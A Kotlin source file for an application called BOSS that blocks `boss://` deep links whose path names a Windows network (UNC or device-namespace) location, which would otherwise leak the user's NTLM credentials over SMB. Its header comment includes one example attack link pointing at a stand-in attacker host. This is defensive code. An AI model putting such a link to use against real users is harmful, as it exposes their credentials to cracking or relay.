package ai.rever.boss.utils

import java.net.URLDecoder

/**
 * Keeps a `boss://` link from making BOSS reach out to a machine the operator never named.
 *
 * On Windows a path of the form `\\host\share\file` is not a place on this machine. The first
 * thing that touches it - `File.exists()`, `canonicalFile`, even `isDirectory` - makes the OS open
 * an SMB connection to `host`, and SMB authenticates by sending the signed-in user's NTLM
 * challenge response along with it. A server the attacker runs receives that response with
 * no prompt and no error, and it is enough to crack offline or relay. The connection is made
 * during validation, so a link that is later refused as "file not found" has already leaked.
 *
 * `boss://file`, `boss://folder` and `boss://workspace` each carry a `path`, the scheme is
 * registered with the OS, and any web page or document can link to it. So one click on
 * `boss://file?path=%5C%5Cattacker.example%5Cshare%5Cx.md` was enough.
 *
 * This is decided from the text of the path alone and never touches the filesystem, because
 * touching it is the harm. It applies to Windows only: elsewhere `//x` is an ordinary path.
 */
internal object NetworkPathGuard {
    private val isWindowsHost = System.getProperty("os.name").lowercase().contains("windows")

    /** Hosts a network path may name without being refused, as a comma-separated list. */
    internal const val TRUSTED_HOSTS_ENV = "BOSS_TRUSTED_NETWORK_HOSTS"
    internal const val TRUSTED_HOSTS_PROPERTY = "boss.trusted.network.hosts"

    /** Names that always mean this machine. */
    private val LOOPBACK_HOSTS = setOf("localhost", "127.0.0.1", "::1")

    /** The `boss://` hosts whose `path` is opened from the filesystem. */
    private val PATH_HOSTS = setOf("file", "folder", "workspace")

    /**
     * True when [path] names a location on another machine (a UNC path), in any spelling Windows
     * accepts. Never touches the filesystem.
     */
    fun isNetworkPath(
        path: String,
        windows: Boolean = isWindowsHost,
    ): Boolean = windows && networkTarget(path) != null

    /**
     * The host a network path names, lower-cased, or null when [path] is not a network path.
     * A WebDAV suffix (`host@SSL`, `host@8080`) is kept as part of the name.
     */
    fun hostOf(
        path: String,
        windows: Boolean = isWindowsHost,
    ): String? = if (windows) networkTarget(path)?.lowercase() else null

    /**
     * The first segment after the network prefix, or null for a local path.
     *
     * Windows takes `/` for the backslash, so both are folded first. The device namespaces
     * (`\\?\`, `\\.\`, `\??\`) are only local when what follows is a drive letter or a volume GUID:
     * `UNC\host` is a network share, and so is `GLOBALROOT\Device\Mup\host`, the redirector's own
     * name for one. Any other device path is refused too, since refusing a device nobody opens
     * through a link costs nothing, and guessing which device names reach the network is how one
     * gets missed.
     */
    private fun networkTarget(path: String): String? {
        val s = path.trimStart { it.isWhitespace() || it.isISOControl() }.replace('/', '\\')
        val device = DEVICE_PREFIXES.firstOrNull { s.startsWith(it) }
        return when {
            device != null -> deviceTarget(s.substring(device.length))
            s.startsWith("\\\\") -> firstSegment(s.substring(2))
            else -> null
        }
    }

    private fun deviceTarget(rest: String): String? =
        when {
            LOCAL_DEVICE_PATH.containsMatchIn(rest) -> null
            rest.startsWith("UNC\\", ignoreCase = true) -> firstSegment(rest.substring(4))
            else -> firstSegment(rest)
        }

    private fun firstSegment(rest: String): String = rest.substringBefore('\\')

    private val DEVICE_PREFIXES = listOf("\\\\?\\", "\\\\.\\", "\\??\\")

    /** `X:` (a drive) or `Volume{guid}`: what a device-namespace path names when it is local. */
    private val LOCAL_DEVICE_PATH = Regex("^([A-Za-z]:(\\\\|$)|Volume\\{[0-9A-Fa-f-]+\\})")

    /** True when [host] is this machine, or one the operator listed by exactly that name. */
    private fun isTrusted(
        host: String,
        trustedHosts: Set<String>,
    ): Boolean = host in LOOPBACK_HOSTS || host in trustedHosts

    /** Hosts the operator has said they trust, from [TRUSTED_HOSTS_ENV] then [TRUSTED_HOSTS_PROPERTY]. */
    fun configuredTrustedHosts(): Set<String> {
        val fromEnv = System.getenv(TRUSTED_HOSTS_ENV)?.takeIf { it.isNotBlank() }
        val raw = fromEnv ?: System.getProperty(TRUSTED_HOSTS_PROPERTY)
        return raw
            ?.split(',')
            ?.map { it.trim().lowercase() }
            ?.filter { it.isNotEmpty() }
            ?.toSet()
            .orEmpty()
    }

    /**
     * Why [uri] must not be acted on, or null when it may be.
     *
     * Only a link that arrived as text from outside is held to this: [DeepLinkOrigin.EXTERNAL].
     * The operator's own CLI and a file they asked the OS to open are their own choice of path.
     * Every `path` in the query is checked, because the handler keeps only the last of a repeated
     * key and a check on the first would be a check on a different value.
     */
    fun refusalFor(
        uri: String,
        origin: DeepLinkOrigin,
        windows: Boolean = isWindowsHost,
        trustedHosts: Set<String> = configuredTrustedHosts(),
    ): String? =
        if (origin in TRUSTED_ORIGINS || deepLinkHostOf(uri) !in PATH_HOSTS) {
            null
        } else {
            pathValuesOf(uri)
                .firstNotNullOfOrNull { path -> hostOf(path, windows)?.takeUnless { isTrusted(it, trustedHosts) } }
                ?.let { blockedMessage(it) }
        }

    /** Origins that chose their own path: the operator's CLI, and a file they opened through the OS. */
    private val TRUSTED_ORIGINS = setOf(DeepLinkOrigin.OPERATOR_CLI, DeepLinkOrigin.OS_FILE_OPEN)
}

private fun blockedMessage(host: String): String =
    "Blocked a link to a network path (\\\\${printable(host)}). " +
        "List it in ${NetworkPathGuard.TRUSTED_HOSTS_ENV} to allow it."

/** The host as it may appear in a message: attacker-chosen, so only name characters, and short. */
private fun printable(host: String): String = host.filter { it.isLetterOrDigit() || it in ".-_@:" }.take(64)

/** Every `path` value in [uri]'s query, decoded as the handler decodes it, in order. */
internal fun pathValuesOf(uri: String): List<String> {
    val query = uri.substringAfter("?", "")
    if (query.isEmpty() || query == uri) return emptyList()
    return query
        .split("&")
        .mapNotNull { param ->
            val parts = param.split("=", limit = 2)
            if (parts.size == 2 && parts[0] == "path") decodeQueryValue(parts[1]) else null
        }
}

private fun decodeQueryValue(value: String): String =
    try {
        URLDecoder.decode(value, "UTF-8")
    } catch (_: IllegalArgumentException) {
        value
    }
